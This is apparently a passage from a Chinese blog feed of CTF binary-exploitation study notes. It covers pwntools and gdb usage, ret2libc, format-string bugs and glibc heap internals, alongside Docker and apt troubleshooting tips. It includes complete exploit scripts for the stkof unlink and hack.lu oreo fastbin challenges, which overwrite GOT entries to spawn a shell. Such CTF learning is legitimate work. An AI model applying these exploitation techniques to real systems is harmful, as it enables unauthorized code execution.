src="https://i.loli.net/2021/01/30/SG5b6xYvB7mhKJt.gif"></p><p>调试</p><pre><code>context.log_level=&#39;debug&#39;gdb.attach(io)io.send(p)gdb.attach(p,&#39;b *0x8048600&#39;)利用gdb动调，在0x8048600处下了个断点</code></pre><p>ROPgadget</p><pre><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</code></pre><p>LibcSearcher</p><pre><code>libc = LibcSearcher(&quot;gets&quot;,gets_real_addr)libcbase = gets_real_addr – obj.dump(&quot;fgets&quot;)system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移</code></pre><p>关闭所以防护编译</p><pre><code>gcc tar.c -z execstack -fno-stack-protector -no-pie -z norelro -o tar-fPIC</code></pre><p>生成shellcode</p><pre><code>shellcode = asm(shellcraft.sh())</code></pre><p>linux自带工具（搜索函数）：</p><pre><code>cd xxxstrings xxx</code></pre><p>输出xxx文件中所有可打印字符<br>    strings -t x libc-2.19.so | grep /bin/sh</p><pre><code>strings xxx | grep /bin/sh</code></pre><p>若有则打印bin/sh字符<br>查看内存</p><pre><code>vmmap </code></pre><p>​<br>查看xxx使用的libc路径及其版本</p><pre><code>ldd xxx</code></pre><p>查看栈中内容    </p><pre><code>stack 300</code></pre><p>查看寄存器</p><pre><code>p /x $rbp</code></pre><p>更改换行符</p><pre><code>dos2unix myexp.py</code></pre><p>查看栈值</p><pre><code>x /40gx $rsp</code></pre><p>​<br>    40代表是显示数目</p><p>​<br>    g代表是8bit显示，x以16进制显示</p><p>​<br>    第一个x代表查看内存</p><blockquote><p>libc_base = int(io.recvuntil(b”\n”,dorp = true),16) - libc.symbols[“puts”]</p></blockquote><blockquote><blockquote><p>int ： 将收到的 16 进制字符串转换成整数<br>dorp = true 是否丢弃掉\n字符，（是）</p></blockquote></blockquote><blockquote><p>cyclic(60)</p></blockquote><blockquote><blockquote><p>生产60字节的垃圾数据</p></blockquote></blockquote><blockquote><p>shellcode = asm(shellcraft.sh())</p></blockquote><blockquote><blockquote><p>生成shellcode</p></blockquote></blockquote><blockquote><p>格式化字符串的任意地址值的修改</p></blockquote><blockquote><p>payload = fmtstr_payload(12,{0x804a048:0x02223322})<br>fmtstr_payload(offset,{addr:number})</p></blockquote><h1 id="ubuntu-ios-镜像文件下载"><a href="#ubuntu-ios-镜像文件下载" class="headerlink" title="ubuntu ios 镜像文件下载"></a>ubuntu ios 镜像文件下载</h1><p><a href="http://mirrors.aliyun.com/ubuntu-releases/">http://mirrors.aliyun.com/ubuntu-releases/</a></p><h1 id="安装VMware-tools"><a href="#安装VMware-tools" class="headerlink" title="安装VMware tools"></a>安装VMware tools</h1><h2 id="安装失败"><a href="#安装失败" class="headerlink" title="安装失败"></a>安装失败</h2><p>进入vmware-tools-distrib/bin, 执行sudo ./vmware-uninstall-tools.pl, （网上有些资料说还需要rm -rf /usr/lib/VMware， 不过我在/usr/lib下已经找不到相关文件了）</p><p>回到vmware-tools-distrib， 重新执行sudo ./vmware-install.pl ， 一路回车</p><p>reboot， 解决！！</p><h2 id="无法拖拽"><a href="#无法拖拽" class="headerlink" title="无法拖拽"></a>无法拖拽</h2><p>执行</p><p>apt-get install open-vm-tools-desktop fuse</p><p>以安装open-vm-tools</p><h1 id="DynELF模块的使用"><a href="#DynELF模块的使用" class="headerlink" title="DynELF模块的使用"></a>DynELF模块的使用</h1><pre><code>def leak(address):    payload=&#39;A&#39;*junk+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4)    #junk是溢出需要的字节，利用pwndbg中的cyclic可以计算出    #write(1,address,4)表示将address向外写    r.send(payload)    data = r.recv(4)    print(data)    return datadyn=DynELF(leak,elf=ELF(&#39;./pwn200&#39;))#调用DynELFsys_addr = dyn.lookup(&#39;system&#39;,libc)print(&#39;system address:&#39;,hex(sys_addr))</code></pre><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>系统调用（x86）<br>    mov eax , 0xb            #系统调用号<br>    mov ebx , [“/bin/sh”]<br>    mov ecx , 0                #参数<br>    mov edx , 0<br>    int 0x80                #中断号</p><p>=&gt; execve(“/bin/sh”,NULL,NULL)</p><p>ROPgadget –binary ret2syscall –only “pop|ret”</p><p>ret  就是pop eip ; esp-2   #b站大学 p3 150 左右</p><p>小端序  与  大端序</p><p>小端序 ： </p><p><img src="https://i.loli.net/2021/03/24/HE4yxZKq7pYGi6V.gif"></p><p>重要寄存器功能：</p><p>RIP<br>*存放当前指令的地址</p><p>RSP<br>*存放当前栈帧的栈顶地址</p><p>RBP<br>*存放当前栈帧的栈底地址</p><p>RAX<br>*同用寄，存放函数存器返回值</p><p>#报错</p><p>##UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 36: ordinal not</p><p>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 36: ordinal not in range(128)</p><p>原因是：python的str默认是ascii编码，和unicode编码冲突，就会报这个标题错误</p><p>解决的办法是，在开头添加如下代码：</p><pre><code>import sysreload(sys)sys.setdefaultencoding(&#39;utf8&#39;)</code></pre><h1 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h1><p><img src="https://i.loli.net/2021/03/24/6aJWjcAIN5Mteu2.gif"></p><p>system_elf = elf.plt[“system”]</p><p>linux自带工具（搜索函数）：</p><p>cd xxx<br>strings xxx</p><p>输出xxx文件中所有可打印字符</p><p>string xxx | grep /bin/sh</p><p>若有则打印bin/sh字符</p><p>如下图，连续调用函数时栈 的结构</p><p><img src="https://i.loli.net/2021/03/24/3E9uhZ6bokyN1We.gif"></p><p>system 执行时找到上两个字作为参数（bin/sh）<br>然后pop bin/sh ， return</p><p>在执行puts函数，上两字寻找参数“hello world”<br>然后pop_ret</p><p>最后执行exit 函数，同上</p><p>libc.symbols[“system”] - libc.symblos[“puts”]</p><p>sendlineafter(b”:”,str(elf.got[“puts”]))</p><p>sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时<br>sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</p><p>接收到：后，将puts函数的got表地址以字符串形式发送</p><p>recvuntil（b”:”）</p><p>接收直到：</p><p>libc_base = int(io.recvuntil(b”\n”,dorp = true),16) - libc.symbols[“puts”]</p><p>int ： 将收到的 16 进制字符串转换成整数<br>dorp = true 是否丢弃掉\n字符，（是）</p><p>cyclic(60)</p><p>生产60字节的垃圾数据</p><p>shellcode = asm(shellcraft.sh())</p><p>生成shellcode</p><blockquote><blockquote><p>e = ELF(‘/bin/cat’)<br>print hex(e.address)  # 文件装载的基地址<br>0x400000</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.symbols[‘write’]) # 函数地址<br>0x401680</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.got[‘write’]) # GOT表的地址<br>0x60b070</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.plt[‘write’]) # PLT的地址<br>0x401680</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.search(‘/bin/sh’).next())# 字符串/bin/sh的地址</p></blockquote></blockquote><blockquote><blockquote><p>gdb.attach(sh) ———-v</p></blockquote></blockquote><blockquote><blockquote><p>sh.send(p)      ——–&gt;启动gdb调试</p></blockquote></blockquote><p>vmmap </p><pre><code>查看内存</code></pre><p>ldd xxx</p><pre><code>查看xxx使用的libc路径及其版本</code></pre><p>stack 300</p><pre><code>查看栈中内容</code></pre><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p>换源</p><pre><code>https://developer.aliyun.com/mirror/?spm=a2c6h.13651104.0.d1002.7711506fiiugWK</code></pre><p>sudo apt update<br>sudo apt upgrade</p><p>在etc/docker下修改docker镜像源，如果没有 daemon.json就新建添加以下内容：</p><pre><code>&#123;  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]&#125;# 也可以添加多个国内源&#123;&quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;, &quot;https://registry.docker-cn.com&quot;]&#125;pip install docker-composedocker-compose up -ddocker-compose build</code></pre><p>查看</p><pre><code>docker images -adocker ps -a</code></pre><p>docker images -q redis会输出所有仓库名为redis的镜像id，所以如果想要删除所有仓库名为redis的镜像，可以这么写：</p><pre><code>docker rmi $(docker images –q redis)</code></pre><p>如果想要删除所有镜像，可以这么写：</p><pre><code>docker rmi $(docker images –qa)</code></pre><p>pwn_deploy_chroot-master<br><a href="https://github.com/giantbranch/pwn_deploy_chroot">https://github.com/giantbranch/pwn_deploy_chroot</a></p><pre><code>如何使用1. Put your pwn program to ./bin （Note that the filename should not contain special characters.）2. python initialize.py3. docker-compose up --build -d     # please run as root您可以编辑 config.py 以决定是否将 /bin/sh 替换为 catflag# Whether to replace /bin/sh## replaceREPLACE_BINSH = True## not replace(default)REPLACE_BINSH = False</code></pre><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><blockquote><p>%100$p</p></blockquote><blockquote><p>$p</p><blockquote><p>打印栈中保存的内容</p></blockquote></blockquote><blockquote><p>%s</p><blockquote><p>将栈中数据解析为地址，打印地址所对应的数据</p></blockquote></blockquote><blockquote><p>%n</p><blockquote><p>写入前方打印成功的字符的个数</p></blockquote></blockquote><p>堆栈图入下</p><p><img src="https://i.loli.net/2021/03/30/ejlVFMdDOQTAPmo.gif"></p><h1 id="ubuntu根目录下空间不足，syslog占用很大空间"><a href="#ubuntu根目录下空间不足，syslog占用很大空间" class="headerlink" title="ubuntu根目录下空间不足，syslog占用很大空间"></a>ubuntu根目录下空间不足，syslog占用很大空间</h1><p>查看当前系统内存情况</p><p>df -h</p><p>查看当前目录下所有木有资源占用情况</p><p>du -sh * </p><p>syslog占用很大空间，可以清空</p><p>cat /dev/null &gt; /var/log/syslog</p><h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>当申请的堆较小时，直接在data段申请一段空间。</p><p>当申请的堆较大时，则在mmap段申请一段空间</p><p>清除缓冲区</p><pre><code>setbuf(stdout,0)</code></pre><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>是内存分配的基本单位</p><p>只会分配字长整数倍的chunk(会自动补齐)</p><p>int* p = malloc(0x100)  实际消耗0x110,因为需要两个控制字段。</p><p><img src="https://i.loli.net/2021/03/31/obmD7J9wpxkS8I1.gif"></p><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc chunk"></a>malloc chunk</h3><p>size的后3 Bity存储控制信息</p><p>|A|M|P|</p><p>prev size 用于存储上一个free chunk大小</p><p>size  用于存储自身控制字段和数据字段大小</p><p>p = 0 表示为free chunk</p><p>p = 1 表示非free chunk</p><p>特殊的是 ， fast chunk的p总是为1 ， 并且不会合并。</p><p><img src="https://i.loli.net/2021/03/31/piN8YSfP9J634t1.gif"></p><h3 id="free-chunk-的合并"><a href="#free-chunk-的合并" class="headerlink" title="free chunk 的合并"></a>free chunk 的合并</h3><p>当下一个chunk发现上一个chunk也是free_chunk时，两个chunk将被合并，size变为两个chunk的总和</p><p>但是数据仍在原地，结构如图</p><p><img src="https://i.loli.net/2021/03/31/B4CGDpESHVWJMmT.gif"></p><p>当堆较小时，堆就在data和bss段的高地址</p><p><img src="https://i.loli.net/2021/03/31/RbFO3SiUqQynHCg.gif"></p><p>逻辑链表</p><blockquote><p>fasebins 按照堆的大小分配bin</p></blockquote><blockquote><p>而每个链表由指针链接形成链表</p></blockquote><blockquote><p>由fd指针指向下一个chunk</p></blockquote><p><img src="https://i.loli.net/2021/03/31/Uefvz8EP7TDpwal.gif"></p><p>###bin双向链表</p><blockquote><p>bin也是栈的结构</p><p>由fd指针指向下一个chunk</p><p>由bk指针指向上一个chunk</p><p>每个chunk相互链接形成双向链表</p></blockquote><p><img src="https://i.loli.net/2021/03/31/wEejkFsSzI6BYtU.gif"><br><img src="https://i.loli.net/2021/03/31/5lEriA7xubqcows.gif"></p><h2 id="double-free-漏洞"><a href="#double-free-漏洞" class="headerlink" title="double_free 漏洞"></a>double_free 漏洞</h2><pre><code>int* p = malloc(0x300) ;int* q = malloc(0x200) ;free(q);free(p);free(q);</code></pre><h1 id="可利用函数"><a href="#可利用函数" class="headerlink" title="可利用函数"></a>可利用函数</h1><p>##fmtstr_payload</p><pre><code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><p>第一个参数表示格式化字符串的偏移；</p><p>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}</p><p>第三个参数表示已经输出的字符个数，若没有，为0，采用默认值即可；</p><p>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</p><p>fmtstr_payload函数返回的就是payload</p><p>##mprotect</p><pre><code>mprotect(void *addr, size_t len, int prot)</code></pre><p>利用vmmap命令在gdb中找到可以修改的段</p><p>int mprotect(void *addr, size_t len, int prot);</p><p>addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。</p><p>len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。<br>prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：</p><p>1）PROT_READ：内存段可读；</p><p>2）PROT_WRITE：内存段可写；</p><p>3）PROT_EXEC：内存段可执行；</p><p>4）PROT_NONE：内存段不可访问。</p><p>返回值：0；成功，-1；失败（并且errno被设置）</p><p>1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。</p><p>2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。</p><p>3）ENOMEM：内核内部的结构体无法分配。</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>利用Unlink机制，向unsortedbin中写入chunk，从而达到攻击效果。这里以ctf-wiki 的例题作为理解。</p><hr><pre><code>context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]if args[&#39;DEBUG&#39;]:    context.log_level = &#39;debug&#39;context.binary = &quot;./stkof&quot;stkof = ELF(&#39;./stkof&#39;)if args[&#39;REMOTE&#39;]:    p = remote(&#39;127.0.0.1&#39;, 7777)else:    p = process(&quot;./stkof&quot;)log.info(&#39;PID: &#39; + str(proc.pidof(p)[0]))libc = ELF(&#39;./libc.so.6&#39;)head = 0x602140def alloc(size):    p.sendline(&#39;1&#39;)    p.sendline(str(size))    p.recvuntil(&#39;OK\n&#39;)</code></pre><p>​<br>    def edit(idx, size, content):<br>        p.sendline(‘2’)<br>        p.sendline(str(idx))<br>        p.sendline(str(size))<br>        p.send(content)<br>        p.recvuntil(‘OK\n’)</p><p>​<br>    def free(idx):<br>        p.sendline(‘3’)<br>        p.sendline(str(idx))</p><p>​<br>    def exp():<br>    # trigger to malloc buffer for io function<br>    alloc(0x100)  # idx 1<br>    # begin<br>    alloc(0x30)  # idx 2<br>    # small chunk size in order to trigger unlink<br>    alloc(0x80)  # idx 3<br>    # a fake chunk at global[2]=head+16 who’s size is 0x20<br>    payload = p64(0)  #prev_size<br>    payload += p64(0x20)  #size<br>    payload += p64(head + 16 - 0x18)  #fd<br>    payload += p64(head + 16 - 0x10)  #bk<br>    payload += p64(0x20)  # next chunk’s prev_size bypass the check<br>    payload = payload.ljust(0x30, ‘a’)</p><pre><code># overwrite global[3]&#39;s chunk&#39;s prev_size# make it believe that prev chunk is at global[2]payload += p64(0x30)# make it believe that prev chunk is freepayload += p64(0x90)edit(2, len(payload), payload)# unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8free(3)p.recvuntil(&#39;OK\n&#39;)# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@gotpayload = &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(    stkof.got[&#39;atoi&#39;])edit(2, len(payload), payload)# edit free@got to puts@pltpayload = p64(stkof.plt[&#39;puts&#39;])edit(0, len(payload), payload)# free global[1] to leak puts addrfree(1)puts_addr = p.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)puts_addr = u64(puts_addr)log.success(&#39;puts addr: &#39; + hex(puts_addr))libc_base = puts_addr - libc.symbols[&#39;puts&#39;]binsh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))system_addr = libc_base + libc.symbols[&#39;system&#39;]log.success(&#39;libc base: &#39; + hex(libc_base))log.success(&#39;/bin/sh addr: &#39; + hex(binsh_addr))log.success(&#39;system addr: &#39; + hex(system_addr))# modify atoi@got to system addrpayload = p64(system_addr)edit(2, len(payload), payload)p.send(p64(binsh_addr))p.interactive()</code></pre><p>​<br>    if <strong>name</strong> == “<strong>main</strong>“:<br>        exp()</p><hr><p>首先构造堆如图所示</p><p><img src="https://i.loli.net/2021/05/10/3Vi6RJ9yWMC4SEm.jpg"></p><p>那么在unsortedbin中则会出现0x6002270-0x18 的chunk，我们通过修改一些chunk为函数来实现其调用。</p><pre><code>payload = &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(stkof.got[&#39;atoi&#39;])edit(2, len(payload), payload)</code></pre><p>例如上一句，向bin中写入了各个函数地址作为chunk地址。</p><p><img src="https://i.loli.net/2021/05/11/s2kbStcz71L9TfQ.gif"></p><pre><code>payload = p64(stkof.plt[&#39;puts&#39;])edit(0, len(payload), payload)</code></pre><p>接着，覆盖free的地址为puts，实现泄露。</p><p>如法炮制，实现system函数的调用。</p><blockquote><blockquote><p>也可以将free改为system，在chunk[3]中写入”bin/sh\0x00”,最后free(3)也可以实现getshell</p></blockquote></blockquote><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><p>fastbin_attach 其基础攻击手段如下：</p><blockquote><blockquote><p><strong>double_free</strong></p></blockquote><p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</p><p>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p></blockquote><p>我们可以构造如下的结构来实现任意地址写的功能</p><p><img src="https://i.loli.net/2021/05/16/GaKyohANWqgInHJ.gif"></p><blockquote><blockquote><p><strong>House of Spirit</strong></p></blockquote><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p></blockquote><p>但是想要成功链接fack_chunk需要如下条件</p><p>fack_chunk 的ISMMAP位不能为1，因为free时mmap的chunk，会单独处理</p><p>fack_chunk 的地址需要对齐，MALLOC_ALIGN_MASK</p><p>fack_chunk 的size大小需要满足相应fastbin，同时也应对齐</p><p>fack_chunk 的next_chunk大小不可越界。即不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem</p><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</p><blockquote><blockquote><p>Alloc to Stack  &amp;&amp;  Arbitrary Alloc</p></blockquote><p>分别是将堆分配到栈，或者是任意地址</p></blockquote><blockquote><p>alloc to stack 可以覆盖栈的返回地址来劫持执行流</p><p>arbirtary alloc 可以使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。（这个我暂时也不懂）</p></blockquote><p>下面就用一道题来实际演示下</p><p>2014 hack.lu oreo <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">题目链接</a></p><p>1.利用堆溢出漏洞，泄露free_got 的地址（那么哪里才能买到呢？）</p><p>我们先free掉任意一个chunk，因为libc的延迟绑定机制，现在我们将free_got写入next_chunk中，然后 show 来泄露got表地址</p><p>2.因为 ++rifle_cnt 语句 会记录创建的chunk的个数，因此可以为攻击准备环境。</p><p>再向message写入payload，准备如下条件来绕过检测</p><pre><code>payload = b&#39;a&#39;*0x1c + b&#39;\x00&#39;*4 + b&#39;A&#39;*4 + p32(100)           #padding + last_chunk + pre_size + size</code></pre><p>现在我们实现了任意地址写入的功能</p><p>3.get_shell</p><p>我们修改某函数的got表指针为libc.symbols[‘system’]函数的地址，利用fget函数写入，并执行该函数，就可以get_shell。</p><p>exp如下<br>    #! /usr/bin/python3<br>    from pwn import *<br>    io = process(‘./oreo’)<br>    elf=ELF(‘./oreo’)<br>    context.log_level=’debug’<br>    libc = ELF(‘libc.so.6’)</p><pre><code>def add (name,des):    io.sendline(&#39;1&#39;)    #io.recvuntil(&#39;Rifle name: &#39;)    io.sendline(name)    #io.recvuntil(&#39;Rifle description: &#39;)    io.sendline(des)def show ():    io.sendline(&#39;2&#39;)def order ():    io.sendline(&#39;3&#39;)def message (notice):    io.sendline(&#39;4&#39;)    #io.recvuntil(&#39;order: &#39;)    io.sendline(notice)</code></pre><p>​<br>    #1 — leak the libcbase<br>    add(b’a’,b’b’)<br>    order()<br>    free_got = elf.got[‘free’]<br>    add(b’a’*27+p32(free_got) , b’b’*25)<br>    show()<br>    io.recvuntil(‘Description: ‘)<br>    io.recvuntil(‘Description: ‘)<br>    free_addr = u32(io.recv(4).ljust(4,b’\x00’))<br>    print (“free_addr=” , hex(free_addr))<br>    libc_base = free_addr - libc.sym[‘free’]<br>    system_addr = libc_base + libc.sym[‘system’]<br>    print (“system_addr”, hex(system_addr))</p><pre><code>#2 --- malloc to bssfor i in range(0x40-2-1):    add(b&#39;a&#39;*27+p32(0),str(i))message_addr = 0x0804A2A8add(b&#39;a&#39;*26+b&#39;A&#39;+p32(message_addr) , b&#39;b&#39;) #write from A8 , message from ccpayload = b&#39;a&#39;*0x1c + b&#39;\x00&#39;*4 + b&#39;A&#39;*4 + p32(100)           #padding + last_chunk + pre_size + sizemessage(payload)    #from c0order()io.recvuntil(&#39;Okay order submitted!&#39;)#get_shellpayload = p32(elf.got[&#39;strlen&#39;])#gdb.attach(cn)add(&#39;b&#39;,payload)   # 0x40: 0x804a2a0 —▸ 0x863c390 ◂— 0x0gdb.attach(cn)message(p32(system_addr)+ b&#39;;/bin/sh\x00&#39;)  #0x804a2a0</code></pre><p>​<br>​<br>    gdb.attach(io)<br>    io.interactive()</p><h1 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h1><h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><p>apt-get install emdebian-archive-keyring  </p><p>apt install gcc-mips-linux-gnu</p><h2 id="使用apt安装时报错"><a href="#使用apt安装时报错" class="headerlink" title="使用apt安装时报错"></a>使用apt安装时报错</h2><p>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><p>解决方案：<br>方案一：</p><p>sudo killall apt apt-get</p><p>如果提示没有apt进程：</p><p>apt: no process found<br>apt-get: no process found</p><p>往下看方案二<br>方案二：<br>依次执行：</p><p>sudo rm /var/lib/apt/lists/lock<br>sudo rm /var/cache/apt/archives/lock<br>sudo rm /var/lib/dpkg/lock*<br>sudo dpkg –configure -a<br>sudo apt update</p><p>完成！</p><h2 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h2><p>mips-linux-gnu-gcc [xxx.c] -static -o [xxxx]</p><h2 id="写入字符引发溢出"><a href="#写入字符引发溢出" class="headerlink" title="写入字符引发溢出"></a>写入字符引发溢出</h2><p>python -c “print ‘A’*200” &gt; passwd</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/03/30/4Ycae86bfKsDMCE.gif&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ida调试快捷键&quot;&gt;&lt;a href=&quot;#ida调试快捷键&quot; class=&quot;headerlink&quot; title=&quot;ida调试快捷</summary>
      
    
    
    
    
  </entry>
  
</feed>
